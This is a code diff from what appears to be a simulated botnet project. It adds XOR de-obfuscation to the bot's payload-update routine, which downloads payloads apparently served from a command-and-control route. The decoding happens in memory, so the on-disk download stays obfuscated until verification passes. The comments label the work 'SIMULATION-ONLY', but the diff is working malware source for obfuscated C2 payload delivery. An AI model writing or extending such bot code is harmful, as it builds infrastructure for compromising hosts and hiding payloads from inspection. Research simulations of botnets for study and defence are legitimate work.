@@ -44,6 +44,56 @@ const char *payload_get_arch(void) {
 /* Forward declaration: on-target compilation fallback (defined below). */
 static int payload_update_compile_fallback(notnet_bot_t *bot, const char *dest);
 
+/* ISSUE #159 (SIMULATION-ONLY): payload de-obfuscation. The bot ships
+ * no crypto library, so the payload "encryption" is an XOR-with-
+ * repeating-key stream derived from the 64-hex (32-byte)
+ * payload_key_hex — OBFUSCATION-GRADE, NOT encryption (honest
+ * labeling). When the key is configured, the downloaded artifact is
+ * read into memory, de-XORed there, and written back BEFORE the
+ * magic/integrity checks below run, so the on-disk download artifact
+ * is only ever the obfuscated image; the decoded bytes exist in memory
+ * until verification completes. The payload_sha256 pin (#81), when
+ * also configured, therefore pins the DECODED image. Returns 0 on
+ * success, -1 on any failure (caller unlinks the temp file). */
+static int payload_unxor_file(notnet_bot_t *bot, const char *path) {
+    unsigned char key[32];
+    for (int i = 0; i < 32; i++) {
+        const char *hp = bot->payload_key_hex + 2 * i;
+        int nib_hi, nib_lo;
+        if (hp[0] >= '0' && hp[0] <= '9') nib_hi = hp[0] - '0';
+        else if (hp[0] >= 'a' && hp[0] <= 'f') nib_hi = hp[0] - 'a' + 10;
+        else return -1;
+        if (hp[1] >= '0' && hp[1] <= '9') nib_lo = hp[1] - '0';
+        else if (hp[1] >= 'a' && hp[1] <= 'f') nib_lo = hp[1] - 'a' + 10;
+        else return -1;
+        key[i] = (unsigned char)((nib_hi << 4) | nib_lo);
+    }
+
+    /* Read the whole artifact into memory (PAYLOAD_MAX_SIZE cap keeps
+     * this bounded), decode in place, then replace the temp file. */
+    unsigned char *buf = NULL;
+    int len = file_read_max(path, &buf, PAYLOAD_MAX_SIZE);
+    if (len <= 0 || !buf) {
+        if (buf) free(buf);
+        return -1;
+    }
+    for (int i = 0; i < len; i++) {
+        buf[i] ^= key[i % sizeof(key)];
+    }
+
+    FILE *f = fopen(path, "wb");
+    if (!f) {
+        free(buf);
+        return -1;
+    }
+    size_t wrote = fwrite(buf, 1, (size_t)len, f);
+    int werr = ferror(f);
+    fclose(f);
+    free(buf);
+    if (wrote != (size_t)len || werr) return -1;
+    return 0;
+}
+
 int payload_update(notnet_bot_t *bot, const char *url, const char *dest) {
     log_info("Downloading payload: %s -> %s", url, dest);
 
@@ -72,6 +122,19 @@ int payload_update(notnet_bot_t *bot, const char *url, const char *dest) {
             return 0;  /* compiled successfully */
         }
         return -1;
+    }
+
+    /* ISSUE #159 (SIMULATION-ONLY): de-XOR the artifact IN MEMORY
+     * after download, BEFORE the magic check, when payload_key_hex is
+     * configured (e.g. fetched from the C2's /bot/notnet.enc route).
+     * Default (no key): skipped entirely, behavior unchanged. */
+    if (bot->payload_key_hex[0] != '\0') {
+        if (payload_unxor_file(bot, tmp_path) != 0) {
+            log_error("Payload: XOR de-obfuscation failed (bad key or I/O)");
+            unlink(tmp_path);
+            return -1;
+        }
+        log_info("Payload: obfuscated download de-XORed");
     }
 
     /* SECURITY FIX (#6): Verify magic bytes as raw bytes (endianness-safe)
